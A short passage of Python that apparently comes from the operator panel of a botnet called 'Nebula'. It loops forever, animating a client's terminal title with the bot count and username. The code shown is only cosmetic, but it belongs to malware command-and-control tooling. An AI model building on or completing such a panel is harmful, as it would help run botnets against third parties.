...
def update_title(client, name):
    while 1:
        try:
            send(client, f"\33]0;N | BOTS: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;Ne | BOTS: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;Neb | BOTS: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;Nebu | BOTS: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;Nebul | BOTS: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;Nebula | BOTS: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;Nebul | BOTS: {len(bots)} | Username: {name}\a", False)
            time.sleep(1)
            send(client, f"\33]0;Nebu | BOTS: {len(bots)} | Username: {name}\a", False)
